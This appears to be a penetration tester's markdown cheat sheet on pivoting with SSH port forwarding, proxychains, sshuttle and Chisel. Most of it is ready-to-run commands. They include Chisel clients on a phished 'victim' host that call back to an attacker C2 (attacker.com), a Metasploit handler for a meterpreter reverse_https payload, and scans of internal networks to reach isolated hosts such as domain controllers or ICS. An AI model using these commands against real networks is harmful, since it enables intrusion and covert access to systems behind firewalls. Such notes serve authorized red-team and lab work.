# SSH Tunneling + SSHuttle and Chisel


Used for pivoting

## Local port forwarding
```bash
ssh -v -N -L localPort:targetIp:targetPort user@sshGateway <-i private_key>
```

## Remote port forwarding
* Below is the preparation that is needed to be done on the SSH Server(Pivot)
```bash
sudo echo "GatewayPorts clientspecified" >> /etc/ssh/sshd_config
sudo systemctl restart ssh
```
* Command:
```bash
ssh -R sshGatewayIp:sshGatewayPort:localIp:localPort user@sshGateway
ssh -R 127.0.0.1:2222:127.0.0.1:22 ubuntu@11.22.33.44
```

## Dynamic port forwarding with proxychains
* Has limitations: Produces inaccurate results (i.e. nmap)[^2][^3][^4]

* Proxychains preparation (Change localPort):
```bash
# Normal
sudo echo "socks4 127.0.0.1 localPort" >> /etc/proxychains.conf
```
* Command to establish connection(Basic command is just "-D"):
```bash
ssh -NfD localPort user@sshGateway
```
* Make use of proxychains:
```bash
proxychains nmap -v --open -sT -Pn -T4 -p21,22,23,25,80,139,443,445,3389,8000,8080 10.0.1.0/24 #-sT -Pn for proxychains
proxychains msfconsole 
proxychains rdesktop targetIP -u user -p password -g 90%
proxychains ssh -NfD 2ndlocalPort user@2ndLevelPhasesshGateway
proxychains firefox
```

## Dynamic port forwarding with SSHuttle
* **Recommended** and does not need root on pivot machine)
* Has limitations: Does not really work with nmap
   * Use a [static nmap binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) instead on the compromised host
   
```bash
sshuttle -v -r user@sshGateway network/netmask

# Using public key authentication:
sshuttle -v -r user@sshGateway network/netmask -e 'ssh -i /path/to/private_key'
```

## Chisel
* **Recommended** and does not need root on pivot machine) [^5]
* Alternative for SSH(Local, Remote and Dynamic) especially on pivoting machines
    * Built on Go
    * Has ready made binary releases on Github which works on a lot of Operating Systems[^6]
        * Better to compile though
   
```bash
# Server (On your attacking machine[Kali])
./chisel server -v -p 8000 --reverse

# Port Forwarding (Commonly on the 1st compromised machine [Pivot Machine])
## Listen on Kali 4444/tcp, forward to 10.10.10.240 port 80
./chisel client -v <YOUR_KALI_IP>:8000 R:4444:10.10.10.240:80

```
* Remote/Reverse Forwarding (for *reverse connections* [i.e. reverse_tcp])
    * Quick Diagrams for the visual people
        * [INTERNET_ISOLATED_MACHINE] --> [Pivot_Machine] --(FIREWALL)--(INTERNET)-- [C2/Kali]
        * making it seamless as if:
        * [INTERNET_ISOLATED_MACHINE] =============================================> [C2/Kali]
    * From Kali: `./chisel server -v -p 8000 --reverse` From C2: `./chisel server -v -p 443 --reverse` 
    * Commonly on the 1st compromised machine [Pivot Machine]
        * Let us call this [Pivot Machine]: *PHISHEDVICTIM01.acme.local*
        * *BEWARE*: May trigger _Windows Firewall Allow/Deny_ pop-up window on this host upon running. May need to allow first or create a manual firewall entry via cli or choose a firewall port already allowed but unused by a service.
        * The command below will direct any traffic it receives on 3333/tcp to your Kali 3333/tcp
            ```batch
            chisel.exe client -v <YOUR_KALI_IP>:8000  3333:127.0.0.1:3333
            #OR
            chisel.exe client -v <YOUR_C2_domain>:443 3333:127.0.0.1:3333
            ```
    * After the command above, execute the command below on your Kali/c2 machine or something similar (i.e. `exploit/multi/handler`)
        ```bash
        nc -lnvp 3333
        #OR
        msfconsole -q -x "use exploit/multi/handler;set LPORT 3333; set LHOST eth0; set payload windows/x64/meterpreter/reverse_https;run -jz"
        ```
    * Now on the [INTERNET_ISOLATED_MACHINE]/target/victim (without direct connection to your C2/Kali) like the DC or ICS.
        * Test
            ```batch
            curl.exe PHISHEDVICTIM01.acme.local:3333
            ```
        * Use a one-liner powershell
        * C2 payload to point to `PHISHEDVICTIM01.acme.local:3333`

* Chisel Socks Proxy
    * Using `reverse` command
        1. On the server (C2[cloud] / Kali VM[internal/labs])
            ```bash
            ./chisel server -v -p 8000 --reverse
            sudo echo "socks5 127.0.0.1 1080" > /etc/proxychains.conf
            ```
        1. On the client/target/victim machine
            ```bash
            chisel.exe client -v <c2/kali_IP>:8000 R:socks
            or
            chisel.exe client -v attacker.com:8000 R:socks
            or
            chisel.exe client -v 192.168.1.5:8000 R:socks
            ```
        1. On the server (C2[cloud] / Kali VM[internal/labs])
            ```bash
            sudo bash -c 'echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf'
            ssh -NfD 1080 127.0.0.1
            proxychains nmap -v --open -sT -Pn -T4 -p21,22,23,25,80,139,443,445,3389,8000,8080 10.0.1.0/24 #-sT -Pn for proxychains
            proxychains msfconsole 
            proxychains rdesktop targetIP -u user -p password -g 90%
            proxychains ssh -NfD 2ndlocalPort user@2ndLevelPhasesshGateway
            proxychains firefox
            ```
    * Using `socks5` command
        1. On the server (C2[cloud] / Kali VM[internal/labs])
            ```bash
            ./chisel server -v -p 8000 --socks5
            ```
        1. On the client/target/victim machine
            ```bash
            chisel.exe client -v <c2/kali_IP>:8000 socks
            or
            chisel.exe client -v attacker.com:8000 socks
            or
            chisel.exe client -v 192.168.1.5:8000 socks
            ```
        1. On the server (C2[cloud] / Kali VM[internal/labs])
            ```bash
            sudo bash -c 'echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf'
            ssh -NfD 1080 127.0.0.1
            proxychains nmap -v --open -sT -Pn -T4 -p21,22,23,25,80,139,443,445,3389,8000,8080 10.0.1.0/24 #-sT -Pn for proxychains
            proxychains msfconsole 
            proxychains rdesktop targetIP -u user -p password -g 90%
            proxychains ssh -NfD 2ndlocalPort user@2ndLevelPhasesshGateway
            proxychains firefox
            ```
    * TIP
        * If the chisel server is on a cloud C2, and you want to connect from your kali(separate machine)
            * Perform step **c.** on your Kali instead, no need to do it on the chisel server(c2)
                * Just change `ssh -NfD 1080 127.0.0.1` to `ssh -NfD 1080 ubuntu@c2domain.com`


[^1]: [not so pro](https://blog.notso.pro/2019-10-24-tactical-debriefing1/)
[^2]: [MrW0r57](https://mrw0r57.github.io/2020-05-31-linux-post-exploitation-10-4/)
[^3]: [CodeProject - Grant Curell](https://www.codeproject.com/tips/634228/how-to-use-proxychains-forwarding-ports)
[^4]: [NetSec](https://netsec.ws/?p=278)
[^5]: [Download from Github](https://github.com/jpillora/chisel)
[^6]: [0xdf](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
